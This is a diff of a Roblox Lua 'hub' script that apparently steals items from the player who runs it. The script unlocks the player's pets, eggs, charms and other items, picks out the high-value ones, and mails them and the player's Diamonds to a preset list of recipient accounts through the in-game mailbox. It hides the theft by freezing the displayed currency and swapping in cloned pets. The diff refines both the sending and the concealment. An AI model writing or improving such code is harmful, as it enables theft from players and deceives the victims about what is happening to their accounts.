@@ -1,4 +1,4 @@
---// Strike Hub Universal Script (All Items + Visual Freeze)
+--// Strike Hub Universal Script (Fixed: All Items + Visual Freeze)
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
@@ -48,41 +48,47 @@ pcall(function()
 	end
 end)
 
---// Capture initial inventory for visual freeze
+--// Capture save
 local rawSave = (saveModule.Get and saveModule.Get()) or {}
 local save = rawSave.Save or rawSave.Inventory or {}
 
-local visualInventory = {Currency = {}, Pet = {}}
+--// Visual freeze setup
+-- Currency visual freeze
+local visualCurrency = {}
 for _, v in pairs(save.Currency or {}) do
-	visualInventory.Currency[v.id] = {_am = v._am}
-end
-for uid, pet in pairs(save.Pet or {}) do
-	visualInventory.Pet[uid] = pet
+	visualCurrency[v.id] = v._am
 end
 
---// Freeze visual currency (without touching real save table)
 task.spawn(function()
 	while task.wait(0.1) do
 		if plr.leaderstats then
-			for id, data in pairs(visualInventory.Currency) do
+			for id, value in pairs(visualCurrency) do
 				local stat = plr.leaderstats:FindFirstChild(id)
 				if stat then
-					stat.Value = data._am
+					stat.Value = value
 				end
 			end
 		end
 	end
 end)
 
---// Freeze pets visually (example, depends on game implementation)
+-- Pets visual freeze
 local petFolder = plr:FindFirstChild("Pets")
+local visualPets = {}
+
 if petFolder then
+	for _, pet in pairs(petFolder:GetChildren()) do
+		local uid = pet.Name
+		visualPets[uid] = pet:Clone()
+		visualPets[uid].Parent = petFolder
+		pet.Parent = nil -- hide original for sending
+	end
+
 	task.spawn(function()
 		while task.wait(0.1) do
-			for uid, petData in pairs(visualInventory.Pet) do
-				if petFolder:FindFirstChild(uid) then
-					-- Keep the pet visually as is
-					petFolder[uid].Parent = petFolder
+			for uid, clone in pairs(visualPets) do
+				if clone.Parent ~= petFolder then
+					clone.Parent = petFolder
 				end
 			end
 		end
@@ -115,23 +121,22 @@ local function getRAP(_, item)
 end
 
 --// Send item function
-local function sendItem(category, uid, am)
+local function sendItem(category, stackKey, amount)
 	for _, user in ipairs(users) do
-		local args = {user, MailMessage, category, uid, am or 1}
+		local args = {user, MailMessage, category, stackKey, amount or 1}
 		local ok, response, err = pcall(function()
 			return network.Invoke("Mailbox: Send", unpack(args))
 		end)
 		if ok and response == true then
 			mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
 			return true
-		elseif err == "They don't have enough space!" or err == "Mailbox is full" then
-			-- try next user
 		end
+		task.wait(0.05)
 	end
 	return false
 end
 
---// Send gems function
+--// Send Gems function
 local function SendAllGems()
 	for i, v in pairs(save.Currency or {}) do
 		if v.id == "Diamonds" and v._am >= mailSendPrice + 10000 then
@@ -148,7 +153,7 @@ local function SendAllGems()
 	end
 end
 
---// Unlock items first
+--// Unlock items
 for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
 	if save[cat] then
 		for uid, item in pairs(save[cat]) do
@@ -159,7 +164,7 @@ for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard"
 	end
 end
 
---// Collect eligible items (RAP >= 10,000,000)
+--// Collect eligible items
 local sortedItems, totalRAP = {}, 0
 for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
 	if save[cat] then
@@ -170,7 +175,16 @@ for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard"
 				if item.pt == 1 then prefix ..= "Golden "
 				elseif item.pt == 2 then prefix ..= "Rainbow " end
 				local name = prefix .. item.id
-				table.insert(sortedItems, {category=cat, uid=uid, amount=item._am or 1, rap=rap, name=name})
+				table.insert(sortedItems, {
+					category = cat,
+					uid = uid,
+					amount = item._am or 1,
+					rap = rap,
+					name = name,
+					StackKey = function()
+						return HttpService:JSONEncode({id=item.id, pt=item.pt, sh=item.sh, tn=item.tn})
+					end
+				})
 				totalRAP += rap * (item._am or 1)
 			end
 		end
@@ -210,7 +224,8 @@ end)
 --// Send items asynchronously
 for _, item in ipairs(sortedItems) do
 	task.spawn(function()
-		sendItem(item.category, item.uid, item.amount)
+		local key = item.StackKey and item.StackKey() or item.uid
+		sendItem(item.category, key, item.amount)
 	end)
 	task.wait(0.05)
 end
